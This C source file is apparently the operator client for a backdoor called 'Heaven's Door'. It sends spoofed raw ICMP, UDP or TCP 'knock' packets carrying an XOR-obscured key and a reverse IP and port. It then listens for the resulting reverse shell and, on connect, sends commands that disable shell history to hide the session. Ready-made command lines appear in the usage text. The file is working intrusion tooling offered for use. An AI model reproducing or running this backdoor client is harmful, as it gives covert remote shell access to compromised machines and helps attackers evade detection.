/* Knock knock on heaven's (back)door 
 *
 * Description: This is a client to access the Heaven's Door
 * Author: F0rb1dd3n
 *
 * Enjoy! ;)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>                                      
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#define INIT	"unset HISTFILE; unset SAVEHIST; uname -a; id; echo; export TERM=linux;\n"

int sockfd;

char good[] = "\e[01;34m[\e[00m+\e[01;34m]\e[00m";
char bad[] = "\e[01;31m[\e[00m-\e[01;31m]\e[00m";
char warn[] = "\e[01;33m[\e[00m!\e[01;33m]\e[00m";

void fatal(char *message) {
   char error_message[129];

   strcpy(error_message, bad);
   strncat(error_message, " Error ", 7); 
   strncat(error_message, message, 93);
   perror(error_message);
   printf("\n\n");
   exit(-1);
}

int checkshell(int fd) {
  char got[32];

  if (write (fd, "echo hacked\n", 12) < 0)
    return -1;

  if (read (fd, got, 32) <= 0)
    return -1;

  return -!strstr (got, "hacked");
}

void shell(int fd) {
    fd_set fds;
    char tmp[0xffff];
    int n;
    
    for (;;) {
	FD_ZERO(&fds);
	FD_SET(fd, &fds);
	FD_SET(0, &fds);

	if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
	    fatal("select");
	    break;
	} 

        /* read from fd and write to stdout */
	if (FD_ISSET(fd, &fds)) {
	   if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
	       fatal("on receive data");
	       break;
	   }
	   if (write(1, tmp, n) < 0) {
	       fatal("write");
	       break;
	   }
	}

	/* read from stdin and write to fd */
	if (FD_ISSET(0, &fds)) {
	    if ((n = read(0, tmp, sizeof(tmp))) < 0) {
	        fatal("read");
	        break;
	    }
	    if (write(fd, tmp, n) < 0) {
	        fatal("on send data");
	        break;
	    }
	    if(strncmp(tmp, "exit\n", 5) == 0) {
	        write(STDOUT_FILENO, "Goodbye!\n", 9);
		break;
	    }
	}
    }
}

void handle_shutdown(int signal){
	close(sockfd);
	exit(0);
}

void listener(int port) {
	int new_sockfd, rec;  
	struct sockaddr_in host_addr, client_addr;
	socklen_t sin_size;
	char buff[256];

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) fatal("setting socket option SO_REUSEADDR");

	signal(SIGTERM, handle_shutdown);
	signal(SIGINT, handle_shutdown);
	
	host_addr.sin_family = AF_INET;		
	host_addr.sin_port = htons(port);	        
	host_addr.sin_addr.s_addr = INADDR_ANY; 
	memset(&(host_addr.sin_zero), '\0', 8); 

	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)	fatal("binding to socket");

	if (listen(sockfd, 5) == -1) {
		fatal("listening on socket");
	} else {
		printf("%s Listening on port %d...\n", good, port);
	}

	while(1) {
		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
	
		if(new_sockfd == -1) fatal("accepting connection");

		printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		
		rec = read(new_sockfd, buff, 256);

		if(checkshell(new_sockfd) == -1) {
			fatal("reverse shell not opened");
		} else {
			printf(" Shell is opened!\n\n");
		}

		if(rec > 0) fprintf(stdout, "%s", buff); 
	
        	send(new_sockfd, INIT, strlen(INIT), 0);
		shell(new_sockfd);
		shutdown(new_sockfd, SHUT_RDWR);
	}
}

void s_xor(char *arg, int key, int nbytes) {
	int i;
	for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

unsigned short csum(unsigned short *buf, int nwords) {
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}

void icmp(char *srcip, char *dstip, char *data) {
        int                     sockicmp;
        unsigned int            nbytes, seq = 0;
        char                    buffer[128];
        struct iphdr            *iph;
        struct icmp             *icmph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        memset(buffer, 0, sizeof(buffer));

        iph = (struct iphdr *) buffer;
        icmph = (struct icmp *) (buffer + sizeof(struct iphdr));

        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) fatal("in creating raw ICMP socket");

        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("in setsockopt");

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());    
        iph->ttl = 255;                
        iph->protocol = IPPROTO_ICMP; 
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        icmph->icmp_type = 8;            
        icmph->icmp_code = ICMP_ECHO;   
        icmph->icmp_id = getpid();
        icmph->icmp_seq = seq++;

        memcpy(icmph->icmp_data, data, strlen(data));

        iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp) + strlen(data) + 1);

        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");

        printf("%s %u bytes sent\n", good, nbytes);
        close(sockicmp);
}

void udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
{
        int                     sockudp;
        unsigned int            nbytes, pckt_tam;
        char                    *buffer;
        struct iphdr            *iph;
        struct udphdr           *udph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
        
	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on allocating buffer memory");

        iph = (struct iphdr *) buffer;
        udph = (struct udphdr *) (buffer + sizeof(struct iphdr));
        
        memset(buffer, 0, pckt_tam);

        if((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) fatal("on creating UDP socket");
	
        if(setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
	
	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct udphdr)), data, strlen(data));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->tot_len = pckt_tam + 1;
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        udph->source = htons(srcport);
        udph->dest = htons(dstport);
        udph->len = htons(sizeof(struct udphdr) + strlen(data));
        
	udph->check = csum((unsigned short *) udph, sizeof(struct udphdr) + strlen(data));
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_port = htons(dstport);
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockudp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");

        printf("%s %u bytes was sent\n", good, nbytes);
        close(sockudp);
}

void tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
{
        int                     socktcp;
        unsigned int            nbytes, pckt_tam;
        char                    *buffer;
        struct iphdr            *iph;
        struct tcphdr           *tcph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        pckt_tam = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
        
	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on allocating buffer memory");

        iph = (struct iphdr *) buffer;
        tcph = (struct tcphdr *) (buffer + sizeof(struct iphdr));
        
        memset(buffer, 0, pckt_tam);

        if((socktcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) fatal("on creating TCP socket");
	
        if(setsockopt(socktcp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
	
	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, strlen(data));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->tot_len = pckt_tam + 1;
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

    	tcph->source = htons(srcport);
        tcph->dest = htons(dstport);
     
    	tcph->seq = 0;
    	tcph->ack_seq = 0;
    	tcph->doff = 5;
    	tcph->fin=0;
    	tcph->syn=1;
    	tcph->rst=0;
    	tcph->psh=0;
    	tcph->ack=0;
    	tcph->urg=0;
    	tcph->window = htons (5840);
    	tcph->urg_ptr = 0;
       
	tcph->check = csum((unsigned short *) tcph, sizeof(struct tcphdr) + strlen(data));
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_port = htons(dstport);
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(socktcp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");

        printf("%s %u bytes was sent\n", good, nbytes);
        close(socktcp);
}

void usage(char *argv){
	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n");
	printf("\nUsage: %s <args>\n\n", argv);
	printf("-x\tProtocol (ICMP/UDP/TCP)\n");
	printf("-s\tSource IP address (You can spoof)\n");
	printf("-t\tTarget IP address\n");
	printf("-p\tSource Port\n");
	printf("-q\tTarget Port\n");
	printf("-d\tData to knock on backdoor: \"<key> <reverse IP> <reverse Port>\"\n");
	printf("-l\tLaunch listener\n\n");
	printf("%s ICMP doesn't need ports\n\n", warn);
	printf("ICMP: %s -x icmp -s 192.168.0.2 -t 192.168.0.3 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
	printf("UDP:  %s -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
	printf("TCP:  %s -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n\n", argv);
	exit(1);
}

int main(int argc, char **argv) {
	pid_t pid;
        char *srcip, *dstip, *data, *prot, *reverse_port;
        int opt, l = 0;
        unsigned int srcport = 0, dstport = 0;

        srcip = dstip = prot = NULL;
 
        while((opt = getopt(argc, argv, "s:t:p:q:x:d:l")) != EOF) {
                switch(opt) {
                        case 'x':
                                prot = optarg;
				if(!strcmp(prot, "icmp")){
					if(!strcmp(prot, "udp")) {
						if(!strcmp(prot, "tcp")) {
							printf("%s wrong protocol\n", bad);
	       						exit(-1);
						}
					}
				}
                                break;
                        case 's':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                srcip = optarg; 
                                break;
                        case 't':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                dstip = optarg;
                                break;
                        case 'p':
                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
                                        printf("%s wrong port\n", bad);
                                        exit(-1);
                                }
                                srcport = atoi(optarg);
                                break;
                        case 'q':
                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
                                        printf("%s wrong port\n", bad);
                                        exit(-1);
                                }
                                dstport = atoi(optarg);
                                break;
                        case 'd':
                                if(strlen(optarg) > 51) {
                                        printf("%s max 100 bytes\n", bad);
					exit(-1);   
                                }
                                data = optarg;
                                break;
			case 'l':
				l = 1;
				break;
                        default: 
                                usage(argv[0]);
                                break;
                }
        }
                                        
        if(srcip == NULL || dstip == NULL || prot == NULL) usage(argv[0]);

        if(!strcmp(prot, "icmp") && (srcport || dstport)) {
                printf("%s ICMP doesn't need ports\n", bad);
        	exit(-1);
	}

	system("clear");
	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
	printf("\e[01;31mKnock knock Neo...\e[00m\n\n");

        if(!strcmp(prot, "icmp")) {
                printf("%s Knocking with ICMP protocol\n", good);
		
		if(l){
			pid = fork();
	
			if(pid == -1) fatal("on forking proccess");

			if(pid > 0) {
				reverse_port = strtok(data, " ");
				reverse_port = strtok(NULL, " ");
				reverse_port = strtok(NULL, " ");
				listener(atoi(reverse_port));
			}

			if(pid == 0){
				s_xor(data, 11, strlen(data));
				usleep(100*1500);
				icmp(srcip, dstip, data);
			}
		} else {
			s_xor(data, 11, strlen(data));
			icmp(srcip, dstip, data);
			printf("\n");
		}
        } else if(!strcmp(prot, "udp")) {
                printf("%s Knocking with UDP protocol\n", good);
	
		if(l){
			pid = fork();

			if(pid == -1) fatal("on forking proccess");

			if(pid > 0) {
				reverse_port = strtok(data, " ");
				reverse_port = strtok(NULL, " ");
				reverse_port = strtok(NULL, " ");
				listener(atoi(reverse_port));
			}

			if(pid == 0){
				s_xor(data, 11, strlen(data));
				usleep(100*1500);
                		udp(srcip, dstip, srcport, dstport, data);
			}
		} else {
			s_xor(data, 11, strlen(data));
                	udp(srcip, dstip, srcport, dstport, data);
			printf("\n");
		}
        } else if(!strcmp(prot, "tcp")) {
                printf("%s Knocking with TCP protocol\n", good);
	
		if(l){
			pid = fork();

			if(pid == -1) fatal("on forking proccess");

			if(pid > 0) {
				reverse_port = strtok(data, " ");
				reverse_port = strtok(NULL, " ");
				reverse_port = strtok(NULL, " ");
				listener(atoi(reverse_port));
			}

			if(pid == 0){
				s_xor(data, 11, strlen(data));
				usleep(100*1500);
                		tcp(srcip, dstip, srcport, dstport, data);
			}
		} else {
			s_xor(data, 11, strlen(data));
                	tcp(srcip, dstip, srcport, dstport, data);
			printf("\n");
		}
        } 
}
